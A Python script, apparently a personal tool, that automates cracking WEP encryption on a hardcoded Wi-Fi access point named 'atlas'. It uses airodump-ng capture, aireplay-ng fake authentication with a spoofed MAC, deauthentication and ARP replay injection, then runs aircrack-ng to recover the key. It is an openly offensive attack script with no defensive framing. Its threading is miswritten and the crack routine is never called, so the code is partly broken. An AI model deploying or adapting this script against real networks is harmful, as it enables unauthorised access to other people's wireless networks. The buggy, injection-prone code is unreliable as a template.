#!/usr/bin/python
import os
import threading
import subprocess
from threading import Thread


interface="wlp0s20u2"
mon_interface="mon0"
wepfile="/home/nindustries/wep.tmp"


def capture(MAC, Channel, BSSID, SSID):
	os.system("airodump-ng -c " + Channel +  " --bssid " + BSSID + " -w captured " + interface)

def cracky2(MAC, Channel, BSSID, SSID):
	#fake_auth_advanced = 

	# Fake authenticates to the wireless access point using the spoofed MAC address.
	os.system("sudo aireplay-ng -1 6000 -o 1 -q 10 -e" + " " + SSID + " -a " + BSSID + " -h " + MAC + " " + mon_interface)#"sudo aireplay-ng -1 0 -a " + BSSID + " -h " + MAC + " " + mon_interface)

	# arp replay packet injection
	os.system("sudo aireplay-ng -3 -b " + BSSID + " -h " + MAC + " " + mon_interface)

	# Crack the password
	with open('/home/nindustries/result', 'w') as outfile:
		subprocess.call(['sudo', 'aircrack-ng', '-b', BSSID, wepfile + '-01.cap'], stdout=outfile)
	#os.system("sudo aircrack-ng -b " + BSSID + " " + wepfile + "-01.cap")


	return 0

def crackWEP(MAC, Channel, BSSID, SSID):

	# Restart the interface
	os.system("sudo airmon-ng stop " + interface)
	os.system("sudo airmon-ng start " + interface + " " + Channel)

	# Spoof it
	# os.system("sudo ifconfig " + mon_interface + " down")
	# os.system("sudo macchanger --mac " + MAC + " " + mon_interface)
	# os.system("sudo ifconfig " + mon_interface + " up")

	os.system("aireplay-ng -c " + Channel +  " -e " + SSID +  " -a " + BSSID + " " + interface)

	Thread(target = capture(MAC, Channel, BSSID, SSID)).start()

	os.system("aireplay-ng -1 6000 -o 1 -q 10 -e " + SSID + " -a " + BSSID + " -h " + MAC + " " + interface)

	# # Scan
	# os.system("sudo airodump-ng -c " + Channel + " -d " + BSSID  + " " + mon_interface)

	# # Run the capture simultaneously
	# Thread(target = cracky2(MAC, Channel, BSSID, SSID)).start()

	# open(wepfile, 'a').close() # touch the file
	# file = open(wepfile, 'r')
	# info=file.readlines()
	# info[3]= "bssid_ap = " + "'" + BSSID + "'" + "\n"
	# info[4]= "spoof_mac = " + "'" + MAC + "'" + "\n"
	# info[5]= "interface = " + "'" + interface + "'" + "\n"
	# info[6]= "cap_file_name = " + "'" + wepfile + "'" + "\n"
	# info[7]= "new_interface = " + "'" + interface + "'" + "\n"
	# info[8]= "ssid = " + "'" + SSID + "'" + "\n"

	# file = open(file_location, 'w')
	# file.writelines(info)
	# file.close()

	# # Start capturing packets
	# os.system("airodump-ng -c " + Channel + " -w " + wepfile + " --bssid " + BSSID + " " + mon_interface)

	return 0

m="a0:0b:ba:cf:23:fc"
c="6"
b="00:21:91:04:B9:25"
s="atlas"

crackWEP(m,c,b,s)
# remove mon0
os.system("sudo airmon-ng stop mon0")